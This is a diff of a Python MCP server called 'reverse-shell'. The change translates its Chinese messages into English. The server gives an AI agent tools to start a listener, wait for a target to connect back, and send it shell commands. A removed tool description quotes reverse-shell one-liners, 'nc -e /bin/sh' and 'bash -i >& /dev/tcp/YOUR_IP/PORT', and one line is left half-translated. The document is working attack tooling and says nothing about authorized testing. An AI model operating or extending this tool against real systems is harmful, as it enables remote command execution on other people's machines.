@@ -115,7 +115,7 @@ def _start_listener(port: int) -> str:
         if _LISTENER is not None:
             # _LISTENER_PORT 可能短暂为 None（例如刚 stop/start），因此做个兜底显示
             show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
-            return f"已在监听中（端口: {show_port}），请先 stop_listener 再重新 start。"
+            return f"Already listening on port {show_port}; call stop_listener before restarting."
         if _CLIENT_SOCK is not None:
             try:
                 _CLIENT_SOCK.close()
@@ -146,15 +146,15 @@ def _start_listener(port: int) -> str:
         ips = _get_local_ips()
         addrs = ", ".join(f"{ip}:{port}" for ip in ips)
         return (
-            f"已在 0.0.0.0:{port} 开始监听。"
-            f"目标机请反弹到: {addrs}（任选其一）。连接后使用 reverse_shell_send_command 执行命令。"
+            f"Listening on 0.0.0.0:{port}. "
+            f"Connect the target to any of: {addrs}. After connection, use reverse_shell_send_command."
         )
 
     if err:
-        return f"启动监听失败（0.0.0.0:{port}）：{err}"
+        return f"Failed to start listener on 0.0.0.0:{port}: {err}"
 
     # 仍未准备好：可能线程调度较慢或环境异常；给出可操作的提示
-    return f"启动监听未确认成功（0.0.0.0:{port}）。请调用 reverse_shell_status 确认，或稍后重试。"
+    return f"Listener startup on 0.0.0.0:{port} is unconfirmed; check reverse_shell_status or retry later."
 
 
 def _stop_listener() -> str:
@@ -189,14 +189,14 @@ def _stop_listener() -> str:
         old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
     with _LOCK:
         _LISTENER_THREAD = None
-    return "监听已停止，已断开当前客户端（如有）。"
+    return "Listener stopped and current client disconnected."
 
 
 def _disconnect_client() -> str:
     global _CLIENT_SOCK, _CLIENT_ADDR
     with _LOCK:
         if _CLIENT_SOCK is None:
-            return "当前无已连接客户端。"
+            return "No client is connected."
         try:
             _CLIENT_SOCK.close()
         except OSError:
@@ -204,7 +204,7 @@ def _disconnect_client() -> str:
         addr = _CLIENT_ADDR
         _CLIENT_SOCK = None
         _CLIENT_ADDR = None
-    return f"已断开客户端 {addr}。"
+    return f"Disconnected client {addr}."
 
 
 def _status() -> dict[str, Any]:
@@ -232,7 +232,7 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
     with _LOCK:
         client = _CLIENT_SOCK
     if client is None:
-        return "错误：当前无已连接客户端。请先 start_listener，等待目标连接后再 send_command。"
+        return "错误：No client is connected.请先 start_listener，等待目标连接后再 send_command。"
     # 使用结束标记以便可靠地截断输出
     wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
     try:
@@ -252,15 +252,15 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
         text = data.decode("utf-8", errors="replace")
         if _END_MARKER in text:
             text = text.split(_END_MARKER)[0].strip()
-        return text or "(无输出)"
+        return text or "(no output)"
     except (ConnectionResetError, BrokenPipeError, OSError) as e:
         with _LOCK:
             if _CLIENT_SOCK is client:
                 _CLIENT_SOCK = None
                 _CLIENT_ADDR = None
-        return f"连接已断开: {e}"
+        return f"Connection closed: {e}"
     except Exception as e:
-        return f"执行异常: {e}"
+        return f"Execution error: {e}"
 
 
 # ---------------------------------------------------------------------------
@@ -269,22 +269,22 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
 
 app = FastMCP(
     name="reverse-shell",
-    instructions="反向 Shell MCP：在本地开启 TCP 监听，等待目标机连接后通过工具执行命令。",
+    instructions="Reverse Shell MCP: start a local TCP listener, wait for a target connection, then execute commands through the tools.",
 )
 
 
 @app.tool(
-    description="在指定端口启动反向 Shell 监听。目标机需执行反向连接（如 nc -e /bin/sh YOUR_IP PORT 或 bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1）。仅支持一个监听器与一个客户端。",
+    description="Start a reverse-shell listener on the specified port. The target must connect back. Supports one listener and one client.",
 )
 def reverse_shell_start_listener(port: int) -> str:
     """Start reverse shell listener on the given port (e.g. 4444)."""
     if port < 1 or port > 65535:
-        return "端口需在 1–65535 之间。"
+        return "Port must be between 1 and 65535."
     return _start_listener(port)
 
 
 @app.tool(
-    description="停止反向 Shell 监听并断开当前客户端。",
+    description="Stop the reverse-shell listener and disconnect the current client.",
 )
 def reverse_shell_stop_listener() -> str:
     """Stop the listener and disconnect the current client."""
@@ -292,23 +292,23 @@ def reverse_shell_stop_listener() -> str:
 
 
 @app.tool(
-    description="查看当前状态：是否在监听、端口、是否有客户端连接及客户端地址。",
+    description="Get listener state, port, client connection state and address.",
 )
 def reverse_shell_status() -> str:
     """Get listener and client connection status."""
     s = _status()
     lines = [
-        f"监听中: {s['listening']}",
-        f"端口: {s['port']}",
-        f"反弹地址(目标机连接): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
-        f"已连接: {s['connected']}",
-        f"客户端: {s['client_address'] or '-'}",
+        f"Listening: {s['listening']}",
+        f"Port: {s['port']}",
+        f"Connect-back addresses: {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
+        f"Connected: {s['connected']}",
+        f"Client: {s['client_address'] or '-'}",
     ]
     return "\n".join(lines)
 
 
 @app.tool(
-    description="向已连接的反向 Shell 客户端发送一条命令并返回输出。若无连接请先 start_listener 并等待目标连接。",
+    description="Send a command to the connected reverse-shell client and return output. If disconnected, start a listener and wait for a target.",
 )
 async def reverse_shell_send_command(command: str) -> str:
     """Send a command to the connected reverse shell client and return output."""
@@ -317,7 +317,7 @@ async def reverse_shell_send_command(command: str) -> str:
 
 
 @app.tool(
-    description="仅断开当前客户端连接，不停止监听（可继续等待新连接）。",
+    description="Disconnect the current client while keeping the listener available for new connections.",
 )
 def reverse_shell_disconnect() -> str:
     """Disconnect the current client without stopping the listener."""
